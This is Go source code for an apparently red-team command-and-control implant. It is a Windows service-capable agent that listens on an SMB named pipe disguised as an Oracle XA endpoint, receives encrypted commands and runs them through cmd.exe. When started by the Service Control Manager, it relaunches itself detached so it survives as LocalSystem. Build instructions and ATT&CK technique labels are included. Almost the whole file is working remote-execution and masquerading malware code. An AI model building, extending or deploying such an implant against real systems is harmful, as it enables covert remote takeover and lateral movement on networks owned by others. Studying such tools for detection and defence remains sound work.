// smbpipe-agent-svc: service-capable named-pipe C2 agent.
//
// Same pipe C2 as smbpipe-agent (byte-mode pipe, X25519 ECDH +
// AES-256-GCM frames, cmd.exe execution) with one addition: when the Service
// Control Manager starts it - e.g. go-thehash `exec` (MS-SCMR service creation,
// T1569.002) - the agent re-launches itself detached and exits. SCM expects a
// service handler and terminates the service process at the ~30 s StartService
// timeout (ERROR_SERVICE_REQUEST_TIMEOUT, 1053); detaching lets the real agent
// survive outside that process, orphaned, in the service's security context
// (LocalSystem by default). Launched from a console / WMI (go-thehash
// exec-wmi) it runs as a normal console process, exactly like smbpipe-agent.
//
// The pipe is created with CreateNamedPipeW directly (golang.org/x/sys/windows)
// instead of github.com/Microsoft/go-winio: go-winio hardcodes
// FILE_PIPE_REJECT_REMOTE_CLIENTS on every pipe it creates, which makes the
// NPFS reject all SMB-originated client connections (STATUS_ACCESS_DENIED)
// even when the DACL allows them. Sliver resolves the same problem by using
// a fork (lesnuages/go-winio) whose PipeConfig has a RemoteClientMode flag.
//
// Source layout:
//
//	main.go                      - accept loop + connection lifecycle (this file)
//	internal/pipeio/             - overlapped Win32 I/O with deadlines; pipe creation
//	internal/securechan/         - ECDH handshake, AEAD framing (protocol layer)
//
// ATT&CK: T1569.002 (System Services: Service Execution), T1047 (WMI),
// T1036.005 (Masquerading: Match Legitimate Name - pipe name)
//
// # Build (cross-compile to Windows)
//
//	go mod tidy
//	GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o smbpipe-agent-svc.exe .
package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"

	"smbpipe-agent-svc/internal/pipeio"
	"smbpipe-agent-svc/internal/securechan"
)

const (
	// Pipe name masquerades as an Oracle XA transaction service endpoint (T1036.005).
	// Distinct from smbpipe-agent's \\.\pipe\oraclexa so both agents can run on
	// the same host without a FIRST_PIPE_INSTANCE collision.
	pipeName = `\\.\pipe\oraclexa_svc`

	inputBufferSize  = 65536   // 64 KB - commands are small
	outputBufferSize = 1048576 // 1 MB  - command output can be large

	maxCommandSize    = 64 * 1024 // enforced on received commands
	connectIdleTimout = time.Hour // ConnectNamedPipe wait before slot recycle
)

func main() {
	// Started by the Service Control Manager (go-thehash `exec` / MS-SCMR)?
	// SCM terminates the service process at its ~30 s start timeout, so break
	// the agent out of that process and let it serve the pipe independently.
	if inService, _ := svc.IsWindowsService(); inService {
		relaunchDetached()
		return
	}

	listener, err := pipeio.Listen(pipeName, true, inputBufferSize, outputBufferSize)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] ListenPipe %s: %v\n", pipeName, err)
		os.Exit(1)
	}
	fmt.Printf("[+] Listening on %s\n", pipeName)

	for {
		listener = serveOne(listener)
	}
}

// relaunchDetached re-spawns this binary as a detached process (no console, no
// link to the SCM-owned service process) and returns, so SCM's start-timeout
// termination reaches only this process. The child's parent is this process,
// not services.exe, so svc.IsWindowsService() is false there and it takes the
// normal console path.
func relaunchDetached() {
	exe, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] os.Executable: %v\n", err)
		os.Exit(1)
	}

	cmd := exec.Command(exe, os.Args[1:]...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: windows.DETACHED_PROCESS | windows.CREATE_NEW_PROCESS_GROUP,
	}
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] relaunch detached: %v\n", err)
		os.Exit(1)
	}
	os.Exit(0)
}

// freshListener recreates the sole listening instance after the previous one
// is gone (all instances closed -> pipe name freed). Retries forever with a
// one-second pause; a broken connection or a failed re-listen must never kill
// the agent.
func freshListener() windows.Handle {
	for {
		h, err := pipeio.Listen(pipeName, true, inputBufferSize, outputBufferSize)
		if err == nil {
			return h
		}
		fmt.Fprintf(os.Stderr, "[!] listen %s: %v\n", pipeName, err)
		time.Sleep(time.Second)
	}
}

// serveOne waits for a client on listener, performs the encrypted handshake,
// serves it, and returns the next listening instance. Exactly one instance
// listens at any time: the next instance is created only after a client binds
// to the current one, so NPFS never has to choose between pending instances.
func serveOne(listener windows.Handle) windows.Handle {
	if err := pipeio.Connect(listener, connectIdleTimout); err != nil {
		fmt.Fprintf(os.Stderr, "[!] ConnectNamedPipe: %v\n", err)
		windows.DisconnectNamedPipe(listener)
		windows.CloseHandle(listener)
		return freshListener()
	}

	next, err := pipeio.Listen(pipeName, false, inputBufferSize, outputBufferSize)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] re-listen %s: %v\n", pipeName, err)
		next = 0
	}

	sc, err := securechan.ServerHandshake(listener)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] handshake: %v\n", err)
	} else if err := handleConn(sc); err != nil {
		fmt.Fprintf(os.Stderr, "[!] connection: %v\n", err)
	}

	windows.FlushFileBuffers(listener)
	windows.DisconnectNamedPipe(listener)
	windows.CloseHandle(listener)

	if next == 0 {
		return freshListener()
	}
	return next
}

// handleConn runs one encrypted request/response cycle. Errors abort the
// connection only - deadlines in pipeio guarantee it can never pin the
// listening slot for long.
func handleConn(sc *securechan.Conn) error {
	commandBytes, err := sc.Read()
	if err != nil {
		return fmt.Errorf("read command: %w", err)
	}
	if len(commandBytes) > maxCommandSize {
		return fmt.Errorf("command too large: %d bytes", len(commandBytes))
	}

	command := string(commandBytes)
	fmt.Printf("[*] exec: %s\n", command)
	output := runCommand(command)

	if err := sc.Write(output); err != nil {
		return fmt.Errorf("write output: %w", err)
	}
	// Block until the client closes its pipe handle (the SMB session teardown
	// propagates as a broken-pipe / disconnect error here). Without this wait,
	// DisconnectNamedPipe in serveOne races the SMB transport delivering the
	// response to the remote client.
	sc.Read()
	return nil
}

func runCommand(command string) []byte {
	cmd := exec.Command("cmd.exe", "/c", command)
	out, err := cmd.CombinedOutput()
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			out = append(out, fmt.Sprintf("\n[exit %d]", exitErr.ExitCode())...)
		} else {
			out = append(out, fmt.Sprintf("\n[error %v]", err)...)
		}
	}
	return out
}
